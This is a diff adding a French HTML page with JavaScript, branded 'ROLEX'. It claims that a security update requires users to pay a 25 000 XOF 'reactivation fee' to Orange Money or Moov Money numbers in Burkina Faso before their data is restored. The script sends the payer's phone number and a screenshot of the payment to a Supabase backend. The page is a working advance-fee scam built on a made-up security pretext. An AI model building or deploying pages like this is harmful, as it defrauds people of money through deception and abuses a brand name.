@@ -1,0 +1,678 @@
+<!DOCTYPE html><html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">  <title>ROLEX — Réactivation du compte</title>
+  <meta name="theme-color" content="#06150d">  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap"
+    rel="stylesheet"
+  >  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
+  >  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>  <style>
+    :root {
+      --bg:#06150d;
+      --card:#0c2417;
+      --card2:#102d1d;
+      --gold:#d4af37;
+      --gold-light:#f0d77a;
+      --green:#10b981;
+      --white:#fff;
+      --muted:#8fa49a;
+      --danger:#ef4444;
+      --border:rgba(212,175,55,.16);
+    }
+
+    * {
+      box-sizing:border-box;
+      margin:0;
+      padding:0;
+    }
+
+    body {
+      min-height:100vh;
+      font-family:"Inter",sans-serif;
+      color:var(--white);
+      background:
+        radial-gradient(
+          circle at top right,
+          rgba(212,175,55,.10),
+          transparent 30%
+        ),
+        radial-gradient(
+          circle at bottom left,
+          rgba(16,185,129,.08),
+          transparent 30%
+        ),
+        var(--bg);
+      padding:25px 15px;
+    }
+
+    .page {
+      width:100%;
+      max-width:520px;
+      margin:auto;
+    }
+
+    .brand {
+      text-align:center;
+      margin-bottom:22px;
+    }
+
+    .logo {
+      width:70px;
+      height:70px;
+      object-fit:cover;
+      border-radius:18px;
+      border:1px solid rgba(212,175,55,.3);
+      margin-bottom:12px;
+    }
+
+    .brand-name {
+      font-size:27px;
+      font-weight:800;
+      letter-spacing:3px;
+      color:var(--gold-light);
+    }
+
+    .brand-text {
+      color:var(--muted);
+      font-size:13px;
+      margin-top:6px;
+    }
+
+    .card {
+      background:
+        linear-gradient(
+          145deg,
+          rgba(16,45,29,.97),
+          rgba(8,28,17,.99)
+        );
+      border:1px solid var(--border);
+      border-radius:22px;
+      padding:24px 20px;
+      box-shadow:0 20px 60px rgba(0,0,0,.35);
+    }
+
+    .notice {
+      border:1px solid rgba(212,175,55,.28);
+      background:rgba(212,175,55,.07);
+      border-radius:15px;
+      padding:16px;
+      margin-bottom:20px;
+    }
+
+    .notice-title {
+      display:flex;
+      align-items:center;
+      gap:9px;
+      color:var(--gold-light);
+      font-size:15px;
+      font-weight:800;
+      margin-bottom:9px;
+    }
+
+    .notice-title i {
+      color:var(--gold);
+    }
+
+    .notice p {
+      color:#d8e2dd;
+      font-size:12px;
+      line-height:1.7;
+    }
+
+    .title {
+      font-size:22px;
+      font-weight:800;
+      margin-bottom:7px;
+    }
+
+    .subtitle {
+      color:var(--muted);
+      font-size:13px;
+      line-height:1.6;
+      margin-bottom:20px;
+    }
+
+    .amount {
+      text-align:center;
+      background:rgba(0,0,0,.20);
+      border:1px solid rgba(212,175,55,.18);
+      border-radius:16px;
+      padding:18px;
+      margin-bottom:20px;
+    }
+
+    .amount-label {
+      color:var(--muted);
+      font-size:11px;
+      margin-bottom:5px;
+    }
+
+    .amount-value {
+      color:var(--gold-light);
+      font-size:29px;
+      font-weight:800;
+    }
+
+    .section-title {
+      font-size:14px;
+      font-weight:700;
+      margin-bottom:12px;
+    }
+
+    .payment {
+      background:rgba(0,0,0,.17);
+      border:1px solid rgba(255,255,255,.07);
+      border-radius:14px;
+      padding:14px;
+      margin-bottom:10px;
+    }
+
+    .payment-name {
+      font-size:13px;
+      font-weight:700;
+      margin-bottom:5px;
+    }
+
+    .payment-number {
+      color:var(--gold-light);
+      font-size:15px;
+      font-weight:800;
+      letter-spacing:.5px;
+    }
+
+    .payment-code {
+      color:var(--muted);
+      font-size:11px;
+      margin-top:4px;
+    }
+
+    .field {
+      margin-bottom:16px;
+    }
+
+    label {
+      display:block;
+      color:#d8e2dd;
+      font-size:12px;
+      font-weight:600;
+      margin-bottom:8px;
+    }
+
+    input {
+      width:100%;
+      height:50px;
+      border-radius:12px;
+      border:1px solid rgba(255,255,255,.09);
+      background:rgba(0,0,0,.2);
+      color:white;
+      outline:none;
+      padding:0 14px;
+      font-family:inherit;
+      font-size:14px;
+    }
+
+    input:focus {
+      border-color:rgba(212,175,55,.6);
+      box-shadow:0 0 0 3px rgba(212,175,55,.08);
+    }
+
+    .file-box {
+      border:1px dashed rgba(212,175,55,.3);
+      border-radius:13px;
+      padding:14px;
+      background:rgba(0,0,0,.15);
+    }
+
+    input[type="file"] {
+      height:auto;
+      padding:8px;
+      border:0;
+      background:transparent;
+    }
+
+    .file-help {
+      color:var(--muted);
+      font-size:10px;
+      margin-top:7px;
+      line-height:1.5;
+    }
+
+    .submit {
+      width:100%;
+      height:52px;
+      border:0;
+      border-radius:13px;
+      cursor:pointer;
+      background:linear-gradient(135deg,var(--gold),#b88d16);
+      color:#08130d;
+      font-family:inherit;
+      font-weight:800;
+      font-size:14px;
+      margin-top:5px;
+    }
+
+    .submit:disabled {
+      opacity:.6;
+      cursor:not-allowed;
+    }
+
+    .message {
+      display:none;
+      border-radius:12px;
+      padding:12px;
+      font-size:12px;
+      line-height:1.5;
+      margin-bottom:16px;
+    }
+
+    .message.error {
+      display:block;
+      background:rgba(239,68,68,.08);
+      border:1px solid rgba(239,68,68,.2);
+      color:#ffb4b4;
+    }
+
+    .message.success {
+      display:block;
+      background:rgba(16,185,129,.08);
+      border:1px solid rgba(16,185,129,.2);
+      color:#9af0ce;
+    }
+
+    .footer {
+      text-align:center;
+      color:#5f7369;
+      font-size:10px;
+      margin-top:18px;
+    }
+  </style></head><body><main class="page">  <div class="brand"><img
+  class="logo"
+  src="https://placehold.co/144x144/0c2417/d4af37?text=ROLEX"
+  alt="ROLEX"
+>
+
+<div class="brand-name">ROLEX</div>
+
+<div class="brand-text">
+  Réactivation de votre compte
+</div>
+
+  </div>  <section class="card"><div class="notice">
+
+  <div class="notice-title">
+    <i class="fa-solid fa-shield-halved"></i>
+    Mise à jour de sécurité
+  </div>
+
+  <p>
+    Suite à une importante mise à jour de sécurité de notre système,
+    votre ancien compte doit être réactivé avant de pouvoir récupérer
+    vos données et accéder normalement à votre espace.
+    <br><br>
+    La réactivation nécessite des frais de
+    <strong>25 000 XOF</strong>.
+    Après vérification et validation du paiement par l'administration,
+    les données disponibles associées à votre ancien compte seront
+    restaurées.
+  </p>
+
+</div>
+
+
+<h1 class="title">
+  Activer mon compte
+</h1>
+
+<p class="subtitle">
+  Effectuez le paiement de 25 000 XOF puis envoyez les informations
+  demandées afin que votre demande soit examinée.
+</p>
+
+
+<div class="amount">
+
+  <div class="amount-label">
+    FRAIS DE RÉACTIVATION
+  </div>
+
+  <div class="amount-value">
+    25 000 XOF
+  </div>
+
+</div>
+
+
+<div class="section-title">
+  Méthodes de paiement
+</div>
+
+
+<div class="payment">
+
+  <div class="payment-name">
+    Orange Money Burkina Faso
+  </div>
+
+  <div class="payment-number">
+    05768266
+  </div>
+
+  <div class="payment-code">
+    Utilisez le paiement Orange Money prévu par la plateforme.
+  </div>
+
+</div>
+
+
+<div class="payment">
+
+  <div class="payment-name">
+    Moov Money Burkina Faso
+  </div>
+
+  <div class="payment-number">
+    51382699
+  </div>
+
+  <div class="payment-code">
+    Utilisez le paiement Moov Money prévu par la plateforme.
+  </div>
+
+</div>
+
+
+<div id="message" class="message"></div>
+
+
+<form id="activationForm">
+
+  <div class="field">
+
+    <label for="payerPhone">
+      Numéro ayant effectué le paiement
+    </label>
+
+    <input
+      type="tel"
+      id="payerPhone"
+      inputmode="numeric"
+      placeholder="Ex. 0700000000"
+      required
+    >
+
+  </div>
+
+
+  <div class="field">
+
+    <label for="proof">
+      Preuve de paiement
+    </label>
+
+    <div class="file-box">
+
+      <input
+        type="file"
+        id="proof"
+        accept="image/*"
+        required
+      >
+
+      <div class="file-help">
+        Envoyez une capture ou une photo claire du paiement.
+      </div>
+
+    </div>
+
+  </div>
+
+
+  <button
+    type="submit"
+    class="submit"
+    id="submitBtn"
+  >
+    <i class="fa-solid fa-paper-plane"></i>
+    Envoyer la demande
+  </button>
+
+</form>
+
+  </section>  <div class="footer">
+    ROLEX — Sécurité et vérification des comptes
+  </div></main><script>
+
+const SUPABASE_URL =
+  "https://cbxjcwjlhvicurpndoyz.supabase.co";
+
+const SUPABASE_PUBLISHABLE_KEY =
+  "sb_publishable_KUd51SQCl10pIgztFFGq9Q_Jp1YCK6o";
+
+
+const supabaseClient =
+  window.supabase.createClient(
+    SUPABASE_URL,
+    SUPABASE_PUBLISHABLE_KEY,
+    {
+      auth: {
+        persistSession:false,
+        autoRefreshToken:false,
+        detectSessionInUrl:false
+      }
+    }
+  );
+
+
+const form =
+  document.getElementById("activationForm");
+
+const payerPhone =
+  document.getElementById("payerPhone");
+
+const proof =
+  document.getElementById("proof");
+
+const submitBtn =
+  document.getElementById("submitBtn");
+
+const message =
+  document.getElementById("message");
+
+
+function showMessage(text,type) {
+
+  message.textContent = text;
+  message.className = "message " + type;
+
+}
+
+
+const token =
+  localStorage.getItem(
+    "rolex_session_token"
+  );
+
+
+if (!token) {
+
+  window.location.href =
+    "connexion.html";
+
+}
+
+
+payerPhone.addEventListener(
+  "input",
+  function() {
+
+    this.value =
+      this.value.replace(/\D/g,"");
+
+  }
+);
+
+
+form.addEventListener(
+  "submit",
+  async function(event) {
+
+    event.preventDefault();
+
+    message.className = "message";
+    message.textContent = "";
+
+
+    const phone =
+      payerPhone.value.trim();
+
+    const file =
+      proof.files[0];
+
+
+    if (!phone) {
+
+      showMessage(
+        "Veuillez saisir le numéro ayant effectué le paiement.",
+        "error"
+      );
+
+      return;
+
+    }
+
+
+    if (!file) {
+
+      showMessage(
+        "Veuillez joindre votre preuve de paiement.",
+        "error"
+      );
+
+      return;
+
+    }
+
+
+    submitBtn.disabled = true;
+
+    submitBtn.innerHTML =
+      '<i class="fa-solid fa-spinner fa-spin"></i> Envoi...';
+
+
+    try {
+
+      /*
+       * IMPORTANT :
+       * Le nom exact du bucket Storage doit correspondre
+       * au bucket utilisé par Kong.
+       *
+       * À vérifier avant mise en production.
+       */
+
+      const extension =
+        file.name
+          .split(".")
+          .pop()
+          .toLowerCase();
+
+
+      const fileName =
+        "activation/" +
+        crypto.randomUUID() +
+        "." +
+        extension;
+
+
+      /*
+       * Upload de la preuve
+       */
+
+      const {
+        error: uploadError
+      } =
+        await supabaseClient.storage
+          .from("payment-proofs")
+          .upload(
+            fileName,
+            file,
+            {
+              contentType:file.type,
+              upsert:false
+            }
+          );
+
+
+      if (uploadError) {
+
+        throw uploadError;
+
+      }
+
+
+      /*
+       * Création de la demande d'activation
+       */
+
+      const {
+        data,
+        error
+      } =
+        await supabaseClient.rpc(
+          "request_activation",
+          {
+            p_token:token,
+            p_payer_phone:phone,
+            p_payment_proof_path:fileName
+          }
+        );
+
+
+      if (error) {
+
+        throw error;
+
+      }
+
+
+      showMessage(
+        "Votre demande a été envoyée. Elle est maintenant en attente de validation par l'administration.",
+        "success"
+      );
+
+
+      submitBtn.innerHTML =
+        '<i class="fa-solid fa-clock"></i> Demande envoyée';
+
+      form.reset();
+
+
+    } catch(error) {
+
+      console.error(
+        "Erreur activation :",
+        error
+      );
+
+
+      showMessage(
+        error.message ||
+        "Impossible d'envoyer la demande. Veuillez réessayer.",
+        "error"
+      );
+
+
+      submitBtn.disabled = false;
+
+      submitBtn.innerHTML =
+        '<i class="fa-solid fa-paper-plane"></i> Envoyer la demande';
+
+    }
+
+  }
+);
+
+</script></body>
+      </html>
